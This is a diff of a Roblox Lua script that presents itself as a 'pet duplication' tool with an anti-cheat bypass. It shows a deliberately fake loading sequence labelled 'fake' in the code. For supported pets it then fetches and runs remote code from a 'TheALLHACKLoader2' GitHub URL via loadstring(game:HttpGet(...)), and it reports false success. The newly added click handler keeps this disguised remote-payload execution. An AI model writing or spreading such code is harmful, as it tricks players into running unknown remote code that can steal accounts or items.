@@ -62,9 +62,9 @@ StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
 StatusLabel.BackgroundTransparency = 1
 StatusLabel.Parent = Frame
 
--- New Warning Box
+-- Warning Box
 local WarningBox = Instance.new("Frame")
-WarningBox.Size = UDim2.new(1, -40, 0, 60)
+WarningBox.Size = UDim2.new(1, -40, 0, 80)
 WarningBox.Position = UDim2.new(0, 20, 0, 100)
 WarningBox.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
 WarningBox.Parent = Frame
@@ -84,7 +84,7 @@ WarningIcon.Parent = WarningBox
 local WarningText = Instance.new("TextLabel")
 WarningText.Size = UDim2.new(1, -50, 1, 0)
 WarningText.Position = UDim2.new(0, 50, 0, 0)
-WarningText.Text = "REQUIRES MYTHICAL+ PET! Lower rarity will freeze."
+WarningText.Text = "ONLY WORKS WITH:\n• Red Fox, Dragonfly, Raccoon\nOther pets will fail to duplicate!"
 WarningText.TextColor3 = Color3.fromRGB(255, 120, 120)
 WarningText.Font = Enum.Font.GothamBold
 WarningText.TextSize = 14
@@ -93,11 +93,11 @@ WarningText.TextYAlignment = Enum.TextYAlignment.Center
 WarningText.BackgroundTransparency = 1
 WarningText.Parent = WarningBox
 
--- Instructions with larger text
+-- Instructions
 local Instructions = Instance.new("TextLabel")
-Instructions.Size = UDim2.new(1, -40, 0, 120)
-Instructions.Position = UDim2.new(0, 20, 0, 170)
-Instructions.Text = "📜 INSTRUCTIONS:\n\n1. Hold a MYTHICAL/DIVINE pet\n2. Keep inventory open\n3. Press DUPLICATE button\n4. Wait 5-10 Minutes\n\n✔️ 92% Success Rate"
+Instructions.Size = UDim2.new(1, -40, 0, 130)
+Instructions.Position = UDim2.new(0, 20, 0, 190)
+Instructions.Text = "📜 INSTRUCTIONS:\n1. Hold one of the supported pets\n2. Keep inventory open\n3. Press DUPLICATE button\n4. Wait 5-10 Minutes\n\n✔️ 92% Success Rate"
 Instructions.TextColor3 = Color3.fromRGB(220, 220, 220)
 Instructions.Font = Enum.Font.Gotham
 Instructions.TextSize = 16
@@ -106,10 +106,10 @@ Instructions.TextYAlignment = Enum.TextYAlignment.Top
 Instructions.BackgroundTransparency = 1
 Instructions.Parent = Frame
 
--- Main button with flashy style
+-- Main button
 local Button = Instance.new("TextButton")
-Button.Size = UDim2.new(0, 260, 0, 50)
-Button.Position = UDim2.new(0.5, -130, 0.9, -35)
+Button.Size = UDim2.new(0, 260, 0, 40)
+Button.Position = UDim2.new(0.5, -130, 0.9, -30)
 Button.Text = "🔄 START DUPLICATION"
 Button.TextColor3 = Color3.fromRGB(255, 255, 255)
 Button.Font = Enum.Font.GothamBold
@@ -126,79 +126,7 @@ ButtonStroke.Color = Color3.fromRGB(100, 180, 255)
 ButtonStroke.Thickness = 2
 ButtonStroke.Parent = Button
 
--- Function to check if player has required tool
-local function hasRequiredTool()
-    local requiredTools = {"Red Fox", "Dragonfly", "Raccoon"}
-    local backpack = game:GetService("Players").LocalPlayer.Backpack
-    local character = game:GetService("Players").LocalPlayer.Character
-    
-    -- Check backpack
-    for _, tool in ipairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            for _, requiredTool in ipairs(requiredTools) do
-                if string.find(tool.Name, requiredTool) then
-                    return true
-                end
-            end
-        end
-    end
-    
-    -- Check character (equipped tools)
-    if character then
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") then
-                for _, requiredTool in ipairs(requiredTools) do
-                    if string.find(tool.Name, requiredTool) then
-                        return true
-                    end
-                end
-            end
-        end
-    end
-    
-    return false
-end
-
--- Fake loading animation function
-local function fakeLoading()
-    StatusLabel.Text = "🔍 VERIFYING PET RARITY..."
-    Button.Text = "⏳ CHECKING..."
-    Button.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
-    wait(2)
-    
-    StatusLabel.Text = "⚠️ BYPASSING PET LIMITS..."
-    wait(2.5)
-    
-    StatusLabel.Text = "⚙️ DUPLICATING PET DATA..."
-    wait(3)
-    
-    StatusLabel.Text = "🚀 FINALIZING DUPLICATE..."
-    wait(1.5)
-end
-
--- Execute the real script when clicked
-Button.MouseButton1Click:Connect(function()
-    -- Check for required tool first
-    if not hasRequiredTool() then
-        StatusLabel.Text = "❌ ERROR: INVALID RARITY TYPE"
-        Button.Text = "🔁 TRY AGAIN"
-        Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-        return
-    end
-    
-    -- Play fake loading sequence
-    fakeLoading()
-    
-    -- Then execute the real script (only if they have the required tool)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader"))()
-    
-    -- Fake error message (keeping original behavior)
-    StatusLabel.Text = "❌ ERROR: INVALID RARITY TYPE"
-    Button.Text = "🔁 TRY AGAIN"
-    Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-end)
-
--- Add a fake watermark
+-- Watermark (RESTORED)
 local Watermark = Instance.new("TextLabel")
 Watermark.Size = UDim2.new(1, 0, 0, 20)
 Watermark.Position = UDim2.new(0, 0, 1, -20)
@@ -208,3 +136,104 @@ Watermark.Font = Enum.Font.Gotham
 Watermark.TextSize = 12
 Watermark.BackgroundTransparency = 1
 Watermark.Parent = Frame
+
+-- Supported pets list
+local SUPPORTED_PETS = {
+    "Red Fox",
+    "Dragonfly",
+    "Raccoon"
+}
+
+-- Check if holding supported pet
+local function isHoldingSupportedPet()
+    local character = game.Players.LocalPlayer.Character
+    if not character then return false end
+    
+    local tool = character:FindFirstChildOfClass("Tool")
+    if not tool then return false end
+    
+    for _, petName in pairs(SUPPORTED_PETS) do
+        if string.find(string.lower(tool.Name), string.lower(petName)) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Fake loading animation (RESTORED)
+local function fakeLoading()
+    StatusLabel.Text = "🔍 VERIFYING PET RARITY..."
+    Button.Text = "⏳ CHECKING..."
+    Button.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
+    task.wait(2)
+    
+    StatusLabel.Text = "⚠️ BYPASSING PET LIMITS..."
+    task.wait(2.5)
+    
+    StatusLabel.Text = "⚙️ DUPLICATING PET DATA..."
+    task.wait(3)
+    
+    StatusLabel.Text = "🚀 FINALIZING DUPLICATE..."
+    task.wait(1.5)
+end
+
+-- Button click handler
+Button.MouseButton1Click:Connect(function()
+    local character = game.Players.LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local tool = character and character:FindFirstChildOfClass("Tool")
+
+    -- Case 1: No pet equipped
+    if not tool or not humanoid or humanoid:GetState() ~= Enum.HumanoidStateType.Running then
+        StatusLabel.Text = "❌ ERROR: NO PET EQUIPPED"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+        Button.Text = "🔁 TRY AGAIN"
+        Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+        
+        -- Flash red
+        for i = 1, 3 do
+            Button.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+            task.wait(0.1)
+            Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            task.wait(0.1)
+        end
+        
+        task.wait(3)
+        StatusLabel.Text = "🟢 SYSTEM READY | Anti-Cheat: BYPASSED"
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        Button.Text = "🔄 START DUPLICATION"
+        Button.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+        return
+    end
+
+    -- Case 2: Unsupported pet
+    if not isHoldingSupportedPet() then
+        StatusLabel.Text = "❌ ERROR: UNSUPPORTED PET"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+        Button.Text = "🔁 TRY AGAIN"
+        Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+        
+        -- Flash red
+        for i = 1, 3 do
+            Button.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+            task.wait(0.1)
+            Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            task.wait(0.1)
+        end
+        
+        task.wait(3)
+        StatusLabel.Text = "🟢 SYSTEM READY | Anti-Cheat: BYPASSED"
+        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        Button.Text = "🔄 START DUPLICATION"
+        Button.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+        return
+    end
+
+    -- Case 3: Supported pet - execute
+    fakeLoading()  -- RESTORED ANIMATION
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCityLoader/TheALLHACKLoader2/refs/heads/main/Loader"))()
+    
+    StatusLabel.Text = "✅ DUPLICATION SUCCESSFUL!"
+    Button.Text = "🔄 START AGAIN"
+    Button.BackgroundColor3 = Color3.fromRGB(80, 255, 80)
+end)
